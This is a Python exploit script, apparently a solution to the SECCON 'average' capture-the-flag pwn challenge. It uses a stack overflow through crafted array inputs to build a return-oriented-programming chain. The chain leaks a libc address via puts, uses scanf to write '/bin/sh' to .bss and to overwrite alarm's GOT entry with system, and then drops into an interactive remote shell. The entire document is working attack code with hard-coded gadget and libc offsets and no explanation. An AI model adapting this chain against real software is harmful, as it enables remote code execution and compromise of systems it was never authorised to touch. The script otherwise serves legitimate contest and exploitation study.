from ptrlib import *
from binascii import hexlify
    
remote = True
#remote = False

elf = ELF("./average")
libc = ELF("./libc.so.6")
if remote == True:
    sock = Socket('average.quals.seccon.jp', 1234) # remote
else:
    sock = Process("./average") # local


pop_rdi = 0x4013a3
pop_rsi_r15 = 0x4013a1
ret = 0x40101a
#lit_lld = next(elf.search(b'%lld'))
lit_lld = 0x400000 + next(elf.search(b'%lld')) # elf_base + $(stringx -tx ./average | grep \%lld)
#print(hex(lit_lld))
puts_plt = elf.plt("puts")
puts_got = elf.got("puts")
alarm_got = elf.got("alarm")
alarm_plt = elf.plt("alarm")
scanf_plt = elf.plt("__isoc99_scanf")
main_func = elf.symbol("main")
addr_bss = elf.section(".bss") + 0x100
#print(hex(addr_bss))
if remote == True:
    gadgets = [0xdf735, 0xdf739, 0xdf73c] # remote
else :
    gadgets = [0x4f3d5, 0x4f432, 0x10a41c] # local


print(sock.recv(3).decode("utf-8"), end='') # n:
print('100')
sock.sendline('100')

for i in range(16):
    print(sock.recv(7).decode("utf-8"), end='') # A[i]:
    send_num = 0xf00
    print(send_num)
    sock.sendline(str(send_num))

print(sock.recv(7).decode("utf-8"), end='') # A[16]:
print('25')
sock.sendline('25')

for i in range(2):
    print(sock.recv(7).decode("utf-8"), end='') # A[i]:
    print('3840')
    sock.sendline('3840')

print(sock.recv(7).decode("utf-8"), end='') # A[19]:
print('20')
sock.sendline('20')

print(sock.recv(7).decode("utf-8"), end='') # A[21]:
print(str(pop_rdi))
sock.sendline(str(pop_rdi))

print(sock.recv(7).decode("utf-8"), end='') # A[22]:
print(str(puts_got))
sock.sendline(str(puts_got))

print(sock.recv(7).decode("utf-8"), end='') # A[23]:
print(str(puts_plt))
sock.sendline(str(puts_plt))

print(sock.recv(7).decode("utf-8"), end='') # A[24]:
print(str(main_func))
sock.sendline(str(main_func))

print(sock.recvline())
if remote == True:
    libc_base = u64(sock.recvline().strip().ljust(8, b'\x00')) - 0x80d90 # libc leak (remote)
    libc.address = libc_base # libc leak (remote)
    system_func = libc_base + 0x503c0
    binsh = libc_base + 0x1ae41f
else:
    libc_base = u64(sock.recvline().strip().ljust(8, b'\x00')) - 0x80aa0 # libc leak (local)
    libc.address = libc_base # libc leak (local)
    system_func = libc_base + 0x4f550
    binsh = libc_base + 0x17e0af
print('libc base', hex(libc_base))

print(sock.recv(3).decode("utf-8"), end='') # n:
print('100')
sock.sendline('100')

for i in range(16):
    print(sock.recv(7).decode("utf-8"), end='') # A[i]:
    print('3840')
    sock.sendline('3840')

print(sock.recv(7).decode("utf-8"), end='') # A[16]:
print('37')
sock.sendline('37')

for i in range(2):
    print(sock.recv(7).decode("utf-8"), end='') # A[17,18]:
    print('3840')
    sock.sendline('3840')

print(sock.recv(7).decode("utf-8"), end='') # A[19]:
print('20')
sock.sendline('20')

print(sock.recv(7).decode("utf-8"), end='') # A[0]:
print(str(pop_rdi), '\t pop rdi; ret;')
sock.sendline(str(pop_rdi))

print(sock.recv(7).decode("utf-8"), end='') # A[0]:
print(str(lit_lld), '\t %lld addr')
sock.sendline(str(lit_lld))

print(sock.recv(7).decode("utf-8"), end='') # A[1]:
print(str(pop_rsi_r15), '\t pop rsi; pop r15; ret;')
sock.sendline(str(pop_rsi_r15))

print(sock.recv(7).decode("utf-8"), end='') # A[2]:
print(str(addr_bss), '\t addr_bss')
sock.sendline(str(addr_bss))

print(sock.recv(7).decode("utf-8"), end='') # A[3]:
print(str(0xAAAA), '\t 0xAAAA')
sock.sendline(str(0xAAAA))

print(sock.recv(7).decode("utf-8"), end='') # A[4]:
print(str(scanf_plt), '\t scanf@plt')
sock.sendline(str(scanf_plt))

print(sock.recv(7).decode("utf-8"), end='') # A[5]:
print(str(pop_rdi), '\t pop rdi; ret;')
sock.sendline(str(pop_rdi))

print(sock.recv(7).decode("utf-8"), end='') # A[6]:
print(str(lit_lld), '\t %lld addr')
sock.sendline(str(lit_lld))

print(sock.recv(7).decode("utf-8"), end='') # A[7]:
print(str(pop_rsi_r15), '\t pop rsi; pop r15; ret;')
sock.sendline(str(pop_rsi_r15))

print(sock.recv(7).decode("utf-8"), end='') # A[8]:
print(str(alarm_got), '\t alarm@got')
sock.sendline(str(alarm_got))

print(sock.recv(7).decode("utf-8"), end='') # A[9]:
print(str(0xAAAA), '\t 0xAAAA')
sock.sendline(str(0xAAAA))

print(sock.recv(7).decode("utf-8"), end='') # A[10]:
print(str(scanf_plt), '\t scanf@plt')
sock.sendline(str(scanf_plt))

print(sock.recv(7).decode("utf-8"), end='') # A[11]:
print(str(pop_rdi), '\t pop rdi; ret;')
sock.sendline(str(pop_rdi))

print(sock.recv(7).decode("utf-8"), end='') # A[12]:
print(str(addr_bss), '\t addr_bss')
sock.sendline(str(addr_bss))

print(sock.recv(7).decode("utf-8"), end='') # A[13]:
print(str(ret), '\t ret;')
sock.sendline(str(ret))

print(sock.recv(7).decode("utf-8"), end='') # A[14]:
print(str(alarm_plt), '\t alarm@plt')
sock.sendline(str(alarm_plt))

binsh = 0x68732f6e69622f

#print(str(binsh).encode())
#print(str(int('0x' + hexlify(b'/bin/sh'[::-1]).decode(),16)))
#print(str(system_func))

#sock.sendline(str(binsh).encode())
sock.sendline(str(int('0x' + hexlify(b'/bin/sh'[::-1]).decode(),16)).encode())
sock.sendline(str(system_func))

sock.interactive()
